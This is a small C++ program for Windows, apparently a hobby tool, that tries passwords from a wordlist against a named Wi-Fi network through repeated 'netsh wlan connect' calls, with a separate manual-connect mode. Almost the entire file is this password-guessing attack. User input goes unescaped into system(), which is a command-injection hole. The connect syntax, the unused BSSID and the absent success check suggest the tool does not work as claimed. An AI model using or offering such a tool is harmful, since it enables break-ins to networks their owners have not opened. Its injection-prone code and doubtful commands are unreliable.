#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>

void connectToWifi(const std::string& ssid, const std::string& password) {
    std::string command = "netsh wlan connect name=\"" + ssid + "\" ssid=\"" + ssid + "\" key=\"" + password + "\"";
    system(command.c_str());
}

void wordlistAttack(const std::string& ssid, const std::string& bssid, const std::string& wordlistPath) {
    std::ifstream wordlist(wordlistPath);
    std::string password;
    while (getline(wordlist, password)) {
        std::cout << "Trying password: " << password << std::endl;
        connectToWifi(ssid, password);
        Sleep(5000); // Wait for 5 seconds before trying the next password
    }
}

void menu() {
    std::string mode, ssid, password, bssid, wordlistPath;

    std::cout << "Select Mode (MC for manual connect, BF for brute force): ";
    std::cin >> mode;

    if (mode == "MC") {
        std::cout << "ENTER SSID: ";
        std::cin >> ssid;
        std::cout << "ENTER PWD: ";
        std::cin >> password;
        connectToWifi(ssid, password);
    } else if (mode == "BF") {
        std::cout << "ENTER SSID: ";
        std::cin >> ssid;
        std::cout << "ENTER BSSID: ";
        std::cin >> bssid;
        std::cout << "ENTER WORDLIST: ";
        std::cin >> wordlistPath;
        wordlistAttack(ssid, bssid, wordlistPath);
    } else {
        std::cout << "Invalid mode selected." << std::endl;
    }
}

int main() {
    menu();
    return 0;
}
